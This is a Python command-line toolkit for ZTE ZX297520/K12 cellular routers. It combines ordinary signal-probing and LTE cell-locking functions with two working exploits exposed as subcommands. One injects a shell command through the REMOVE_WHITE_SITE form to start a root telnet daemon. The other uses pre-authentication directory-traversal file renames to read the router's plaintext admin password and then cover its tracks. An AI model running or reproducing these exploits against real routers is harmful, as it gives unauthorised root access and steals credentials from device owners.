#!/usr/bin/env python3
"""
ZTE ZX297520 / K12 Cellular Router Toolkit & Exploitation Client
Supports:
- Device discovery & signal metrics (RSRP, RSRQ, SNR, EARFCN, PCI, Band)
- Cell Locking (EARFCN + PCI via AT+ZLTELC IPC)
- Carrier / Band Preference configuration
- RF Bearer reconnect / fast cell switch
- Root shell enablement (CVE/Command Injection via REMOVE_WHITE_SITE or TZ_CMD_SECURE_LOGIN)
- Pre-auth Admin Password extraction via directory traversal
"""

import argparse
import base64
import json
import re
import sys
import time
import requests

class ZTEClient:
    def __init__(self, host="192.168.0.1", timeout=5):
        self.host = host.rstrip("/")
        self.base_url = f"http://{self.host}"
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Referer": f"{self.base_url}/index.html",
            "X-Requested-With": "XMLHttpRequest",
            "Accept": "application/json, text/javascript, */*; q=0.01"
        })

    def goform_get(self, cmd_keys):
        """Query status and parameters via goform_get_cmd_process."""
        url = f"{self.base_url}/goform/goform_get_cmd_process"
        if isinstance(cmd_keys, list):
            cmd_str = ",".join(cmd_keys)
        else:
            cmd_str = cmd_keys
        try:
            resp = self.session.get(url, params={"cmd": cmd_str, "multi_data": "1"}, timeout=self.timeout)
            resp.raise_for_status()
            return resp.json() if resp.text.startswith("{") else {"raw": resp.text}
        except Exception as e:
            return {"error": str(e)}

    def goform_set(self, goform_id, **kwargs):
        """Invoke action or parameter modification via goform_set_cmd_process."""
        url = f"{self.base_url}/goform/goform_set_cmd_process"
        payload = {"isTest": "false", "goformId": goform_id}
        payload.update(kwargs)
        try:
            resp = self.session.post(url, data=payload, timeout=self.timeout)
            resp.raise_for_status()
            try:
                return resp.json()
            except ValueError:
                return {"result": resp.text}
        except Exception as e:
            return {"error": str(e)}

    def probe(self):
        """Probe router identification, hardware/firmware versions, and cellular metrics."""
        keys = [
            "wa_inner_version", "cr_version", "hardware_version", "modem_msn",
            "imei", "m_imei", "network_type", "network_provider", "lte_pci",
            "lte_earfcn", "cell_id", "lte_rsrp", "lte_rsrq", "lte_snr",
            "lte_ca_pcell_band", "lte_ca_scell_band", "wan_ipaddr", "lan_ipaddr"
        ]
        return self.goform_get(keys)

    def login(self, password, username="admin"):
        """Authenticate to WebUI."""
        pwd_b64 = base64.b64encode(password.encode()).decode()
        res = self.goform_set("LOGIN", password=pwd_b64, username=username, save_login="1")
        return res

    def lock_cell(self, earfcn, pci, unlock=False):
        """
        Lock modem to a specific LTE Downlink EARFCN and Physical Cell ID (PCI).
        Underlying handler generates AT+ZLTELC command to baseband DSP.
        """
        action = "0" if unlock else "1"
        res = self.goform_set(
            "LOCK_FREQUENCY",
            actionlte=action,
            uarfcnlte=str(earfcn) if not unlock else "0",
            callParaIdlte=str(pci) if not unlock else "0"
        )
        return res

    def reconnect_rf(self):
        """Force bearer disconnect and re-attach to apply new cell/band immediately."""
        print("[*] Dropping cellular connection...")
        self.goform_set("DISCONNECT_NETWORK")
        time.sleep(1.5)
        print("[*] Re-attaching to cellular network...")
        res = self.goform_set("CONNECT_NETWORK")
        return res

    def enable_telnet(self):
        """Trigger command injection to start busybox telnetd on port 23."""
        payload = 'test" ; telnetd -l /bin/ash #'
        print(f"[*] Attempting REMOVE_WHITE_SITE injection: {payload}")
        res1 = self.goform_set("REMOVE_WHITE_SITE", ids=payload)
        
        # Also attempt TZ_CMD_SECURE_LOGIN debug switch
        print("[*] Attempting TZ_CMD_SECURE_LOGIN debug activation...")
        res2 = self.goform_set("TZ_CMD_SECURE_LOGIN", telnetdEnable="y", adbEnable="y", dropbearEnable="y")
        return {"remove_white_site": res1, "secure_login": res2}

    def extract_admin_password(self):
        """Extract plaintext admin password using directory traversal vulnerability."""
        print("[*] Executing directory traversal shuffle...")
        self.goform_set("HTTPSHARE_FILE_RENAME", old_name="/mmc2/./../../../etc_rw/wifi", new_name="/mmc2/./../../../etc_rw/wifi_backup")
        time.sleep(0.2)
        self.goform_set("HTTPSHARE_FILE_RENAME", old_name="/mmc2/./../../../etc_rw/nv/backup", new_name="/mmc2/./../../../etc_rw/nv/qrcode_ssid_wifikey.png")
        time.sleep(0.2)
        self.goform_set("HTTPSHARE_FILE_RENAME", old_name="/mmc2/./../../../etc_rw/nv", new_name="/mmc2/./../../../etc_rw/wifi")
        time.sleep(0.2)

        recovered_pwd = None
        try:
            cfg_url = f"{self.base_url}/img/qrcode_ssid_wifikey.png/cfg"
            resp = self.session.get(cfg_url, timeout=self.timeout)
            if resp.status_code == 200:
                match = re.search(rb'admin_Password=(.*?)\x00', resp.content)
                if match:
                    recovered_pwd = match.group(1).decode("utf-8", errors="ignore")
        except Exception as e:
            print(f"[-] Config fetch failed: {e}")

        # Cleanup paths
        print("[*] Restoring filesystem paths...")
        self.goform_set("HTTPSHARE_FILE_RENAME", old_name="/mmc2/./../../../etc_rw/wifi", new_name="/mmc2/./../../../etc_rw/nv")
        time.sleep(0.2)
        self.goform_set("HTTPSHARE_FILE_RENAME", old_name="/mmc2/./../../../etc_rw/nv/qrcode_ssid_wifikey.png", new_name="/mmc2/./../../../etc_rw/nv/backup")
        time.sleep(0.2)
        self.goform_set("HTTPSHARE_FILE_RENAME", old_name="/mmc2/./../../../etc_rw/wifi_backup", new_name="/mmc2/./../../../etc_rw/wifi")

        return recovered_pwd

def main():
    parser = argparse.ArgumentParser(description="ZTE K12 / ZX297520 Cellular Toolkit & Exploitation Utility")
    parser.add_argument("--host", default="192.168.0.1", help="Target router IP address (default: 192.168.0.1)")
    
    subparsers = parser.add_subparsers(dest="command", required=True, help="Command to execute")

    # Probe
    subparsers.add_parser("probe", help="Probe router identification and live RF metrics")

    # Lock Cell
    lock_parser = subparsers.add_parser("lock-cell", help="Lock LTE EARFCN and PCI")
    lock_parser.add_argument("--earfcn", type=int, required=True, help="Downlink EARFCN (e.g. 1650 for B3, 3000 for B7)")
    lock_parser.add_argument("--pci", type=int, required=True, help="Physical Cell ID (0-503)")
    lock_parser.add_argument("--reconnect", action="store_true", help="Automatically reconnect RF bearer after locking")

    # Unlock Cell
    unlock_parser = subparsers.add_parser("unlock-cell", help="Clear cell lock and return to auto selection")
    unlock_parser.add_argument("--reconnect", action="store_true", help="Automatically reconnect RF bearer")

    # Reconnect RF
    subparsers.add_parser("reconnect", help="Trigger bearer disconnect/connect cycle")

    # Enable Telnet
    subparsers.add_parser("enable-telnet", help="Trigger command injection exploit to spawn root telnetd")

    # Get Password
    subparsers.add_parser("get-password", help="Extract admin password via pre-auth directory traversal")

    args = parser.parse_args()
    client = ZTEClient(host=args.host)

    if args.command == "probe":
        print(f"[*] Probing ZTE router at {args.host}...")
        data = client.probe()
        print(json.dumps(data, indent=2))

    elif args.command == "lock-cell":
        print(f"[*] Locking cell to EARFCN={args.earfcn}, PCI={args.pci}...")
        res = client.lock_cell(args.earfcn, args.pci)
        print(f"[+] Lock result: {res}")
        if args.reconnect:
            client.reconnect_rf()

    elif args.command == "unlock-cell":
        print("[*] Releasing cell lock...")
        res = client.lock_cell(0, 0, unlock=True)
        print(f"[+] Unlock result: {res}")
        if args.reconnect:
            client.reconnect_rf()

    elif args.command == "reconnect":
        client.reconnect_rf()

    elif args.command == "enable-telnet":
        res = client.enable_telnet()
        print(f"[+] Exploit sent. Results: {res}")
        print(f"[*] Try connecting: telnet {args.host}")

    elif args.command == "get-password":
        pwd = client.extract_admin_password()
        if pwd:
            print(f"[+] Successfully extracted admin password: '{pwd}'")
        else:
            print("[-] Could not extract admin password.")

if __name__ == "__main__":
    main()
